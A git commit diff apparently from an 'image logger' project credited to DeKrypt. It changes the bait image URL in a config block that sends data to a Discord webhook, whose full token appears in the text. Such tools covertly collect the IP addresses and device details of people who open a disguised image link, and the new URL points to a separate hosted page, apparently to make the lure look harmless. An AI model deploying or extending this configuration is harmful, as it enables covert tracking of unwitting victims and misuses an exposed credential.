3eb9aac962903ddeb843a15e7d4d01d35b302cc1
FazetacoPro <diesan8030@gmail.com>
2026-05-13 19:57:34 -0600

    Update webhook image URL in index.py

--- api/index.py
+++ api/index.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1502884285173207171/tzGULIB7t93toj279o3MtUVMXc-D4NuYin07GVhmtSaj0CWLk64XXXHm4ODqWHxdvTf5",
-    "image": "https://cdn.memegenerator.es/imagenes/memes/full/30/79/30792940.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://foto-one-sandy.vercel.app/", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
